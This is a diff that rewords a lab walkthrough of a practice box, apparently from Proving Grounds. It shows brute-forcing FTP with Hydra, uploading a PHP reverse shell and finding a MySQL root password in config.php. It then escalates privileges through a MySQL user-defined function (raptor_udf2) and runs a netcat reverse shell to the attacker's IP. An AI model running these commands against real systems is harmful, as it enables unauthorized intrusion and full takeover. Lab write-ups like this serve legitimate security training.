@@ -12,20 +12,19 @@ IP: 192.168.189.56
 
 
 # Resolution summary
-- Bruteforced ftp server utilizing Hydra utilizing common ftp credentials
-- Found directories we can navigate to from webpages
-- Uploaded php reverse shell to directory in ftp server
-- Navigated to webpage and clicked the reverse shell and received a shell
-- Found mysql port 3306 was running as local host on target machine
-- Found root credntials for mysql in config file
-- Googled mysql root privilege escalation and found steps to escalate privileges with MYSQL User Defined Functions
-- Followed the step to escalate privieges and received a root  shell
+- Used Hydra to brute-force the FTP server with common FTP credentials.
+- Discovered directories accessible through webpages
+- Uploaded a PHP Reverse Shell to the FTP Server directory.
+- Accessing the webpage, I clicked on the reverse shell to obtain a shell.
+- Discovered the target machine's MySQL port 3306 was operating as a local host.
+- Found the MySQL root credentials in the configuration file.
+- I used Google to get instructions on using MYSQL User Defined Functions to escalate privileges for root privileges. 
+- Acquired a root shell after following the procedure to escalate privileges.
 
 ## Improved skills
-- Bruteforing common ftp credentials for ftp server
-- Uploading php reverse shell to ftp server
+- Brute-forcing  FTP server's common credentials
 - Reading config files to find credentials
-- Root privileges for mysql User Defined Functions Privilege Escalation
+- Learned privilege escalation for MySQL User Defined Functions with root privileges
 
 ## Used tools
 - nmap
@@ -103,8 +102,6 @@ Enumerated top 200 UDP ports:
 # Enumeration
 ## Port 8295
 
-#### Per the previous NMAP scan found port 8295 which runs HTTP
-
 #### Typed "sudo gobuster dir -u http://192.168.189.56:8295 -w /usr/share/dirb/wordlists/common.txt -e -k -t50 -x "txt,html,php,asp,aspx,jsp" -o "/home/kali/Downloads/ProvingGroundsBoxes/Banzai/tcp_8295_http_common.txt" and found the following directory's I have access to:
 
 ![](Images/Pasted%20image%2020220930213106.png)
@@ -113,41 +110,43 @@ Enumerated top 200 UDP ports:
 
 ## Port 21
 
-#### Per the previous NMAP scan found port 21 (FTP) (not allowed to log in with anonymous)
+- Based on the previous NMAP scan, port 21 (FTP) has been identified, but anonymous login is not allowed.
 
-#### Navigated to "/usr/share/seclists/Passwords/ftp-betterdefaultpasslist.txt" and cat'd the file and placed the usernames:passwords into a file named "ftp_common_passwords.txt"
+# Exploitation - Weak FTP credentials leading to uploading a PHP reverse shell and obtaining a foothold 
+
+Using Hydra and common FTP credentials, we were able to brute-force our way into the FTP server. We then upload a PHP reverse shell to a directory on the FTP server.
+
+- Access the directory "/usr/share/seclists/Passwords/ftp-betterdefaultpasslist.txt" and displayed the contents of the file. Then, saved the usernames and passwords into a new file called "ftp_common_passwords.txt".
 
 ![](Images/Pasted%20image%2020221001094042.png)
 ![](Images/Pasted%20image%2020221001094414.png)
 ![](Images/Pasted%20image%2020221001094507.png)
 
-#### Typed "hydra -f -C ftp_common_passwords.txt 192.168.177.56 ftp" which "-C" flag allows inputting a username and password with the following combo list:
-"username:password" and found ftp server username is "admin" and password is "admin"
+- Execute the command below using a password brute forcing tool called hydra and successfully identified the valid username and password combination as admin for the FTP Server.
+
+hydra -f -C ftp_common_passwords.txt 192.168.177.56 ftp
 
 ![](Images/Pasted%20image%2020221001094549.png)
 
----
-
-# Exploitation
-## PHP Reverse Shell Upload Onto FTP Server
-
-#### Logged into ftp server with username "admin" and password "admin" and found directory "/js" found accessible in the gobuster scan above:
+- We successfully accessed the FTP server using the credentials and discovered that the "/js" directory was accessible during the previous GoBuster scan.
 
 ![](Images/Pasted%20image%2020221001094625.png)
 
-#### Typed "lcd" in ftp server and found I was in local directory "/home/kali":
-
+- Enter "lcd" command in the FTP server and discovered that we are currently in the local directory "/home/kali".
+  
 ![](Images/Pasted%20image%2020221001094655.png)
 
-#### Created php pentest reverse shell script in vim file named "reverse_shell.php" on my kali machine in the "/home/kali"directory
+- We create a PHP reverse shell script using a Vim file named “reverse_shell.php” on our Kali machine, which is stored in the “/home/kali” directory.
 
-#### Navigated to directory "/js" in ftp server:
+- We access the "/js" directory on the FTP server.
 
-#### Typed "mput reverse_shell.php" to upload the reverse shell into the ftp server on directory "/js":
+- We upload the reverse shell into the FTP server on directory "/js" by typing "mput reverse_shell.php".
 
 ![](Images/Pasted%20image%2020221001095230.png)
 
-#### Navigated to http://192.168.143.56:8295/js/ and found the reverse shell uploaded on the page and clicked the link and received a reverse shell on penelope listener:
+- We initiate a penelope listener via port 8080 on our Kali machine.
+
+- We access the website at http://192.168.143.56:8295/js/.  Discovered the reverse shell uploaded on the page, clicked the link, and successfully obtained a reverse shell on the Penelope listener.
 
 ![](Images/Pasted%20image%2020221001095356.png)
 ![](Images/Pasted%20image%2020221001095428.png)
@@ -156,29 +155,28 @@ Enumerated top 200 UDP ports:
 ---
 
 
-# Privilege Escalation
+# Privilege Escalation - Readable config file leading to MySQL User-Defined Functions - Root Privileges Privilege Escalation
 ## Local Enumeration
 
-#### Navigated to directory "/var/www" and found "config.php" file and cat'd the file and found user "root" and password "EscalateRaftHubris123":
+- After navigating to the directory "/var/www", we discover the "config.php" file. Upon reading the file, we came across the username "root" and the password "EscalateRaftHubris123".
 
 ![](Images/Pasted%20image%2020221001095458.png)
 
-#### Typed "netsat –tulpn" and found port "3306" (mysql) listening on localhost:
+- After running the command "netsat –tulpn," we discover that port "3306" (MySQL) is actively listening on localhost.
 
 ![](Images/Pasted%20image%2020221001095532.png)
 
 ## Port 3306
 
-#### Typed "mysql –u root –p" and logged in with the found password for mysql "EscalateRaftHubris123":
+- We type "mysql –u root –p" and log in with the discovered password for mysql "EscalateRaftHubris123":
 
 ![](Images/Pasted%20image%2020221001095708.png)
 
 
-
 ## Privilege Escalation vector
-## Root Mysql User-Defined Functions 
+## MySQL User-Defined Functions - Root Privileges 
 
-#### Googled "mysql root privilege escalation" as I was able to login with root in Mysql and found the following webpage listing the steps to escalate privileges:
+- We search for "mysql root privilege escalation" considering we were able to log in with root in Mysql. We come across a webpage that provided a list of steps to escalate privileges.
 
 ![](Images/Pasted%20image%2020221001095752.png)
 ![](Images/Pasted%20image%2020221001095822.png)
@@ -187,41 +185,41 @@ Enumerated top 200 UDP ports:
 ![](Images/Pasted%20image%2020221001100004.png)
 ![](Images/Pasted%20image%2020221001100029.png)
 
-#### Typed "searchsploit -m linux/local/1518.c" to place exploit on my kali machine
+- We enter the command "searchsploit -m linux/local/1518.c" to transfer the exploit onto our Kali machine.
 
-#### Started a http server on my kali machine to host the "1518.c" file
+- We set up a Python HTTP server on our Kali machine to host the "1518.c" file.
 
-#### Navigated to "/var/www" directory on target machine as it was writeable
+- We access the "/var/www" directory on the target machine since it had write permissions.
 
-#### Typed "wget [kali IP]:8295/1518.c" and the shared object file was downloaded to the target machine
+- We execute the command "wget [kali IP]:8295/1518.c" and successfully download the shared object file to the target machine.
 
-#### Typed "gcc -g -c 1518.c -o raptor_udf2.o -fPIC" and then "gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc" to be compiled into a shared object file
+- We enter the command "gcc -g -c 1518.c -o raptor_udf2.o -fPIC" followed by "gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc" to compile it into a shared object file.
 
-#### Typed "mysql –u root –p" and logged in with the found password for mysql "EscalateRaftHubris123" to login into mysql:
+ - Again we enter the command "MySQL –u root –p" and successfully log in to MySQL using the discovered password, "EscalateRaftHubris123".
 
 ![](Images/Pasted%20image%2020221001100055.png)
 
-#### Typed "show variables like '%plugin%';" to show the current plugin directory in the database
-
+- We enter the command "show variables like '%plugin%';" to retrieve the current plugin directory in the database.
+  
 ![](Images/Pasted%20image%2020221001100121.png)
 
-#### Typed "use mysql;"
+- We enter the command "use mysql;"
 
-#### Typed "create table foo(line blob);"
+- We enter the command "create table foo(line blob);"
 
-#### Typed "insert into foo values(load_file('/var/www/raptor_udf2.so'));"
+- We enter the command "insert into foo values(load_file('/var/www/raptor_udf2.so'));"
 
-#### Typed "select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';"
+- We execute the command "select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';"
 
-#### Typed "create function do_system returns integer soname 'raptor_udf2.so';"
+- We enter the command "create function do_system returns integer soname 'raptor_udf2.so';"
 
-#### Typed "select * from mysql.func;" to conirm the "raptor_udf2.so" shared object file got placed in the do_system function table:
+- We enter the command "select * from MySQL.func;" to verify that the "raptor_udf2.so" shared object file was successfully added to the do_system function table.
 
 ![](Images/Pasted%20image%2020221001100150.png)
 
-#### Started a netcat listner on my kali machine listening on port 8295
+- We initiate a netcat listener on our Kali machine, set to listen on port 8295.
 
-#### Typed "select do_system('nc 192.168.49.101 8295 -e /bin/bash');" in mysql database on target machine and received a root shell:
+- We enter the command "select do_system('nc 192.168.49.101 8295 -e /bin/bash');" into the MySQL database on the target machine and successfully gained a root shell.
 
 ![](Images/Pasted%20image%2020221001100235.png)
 
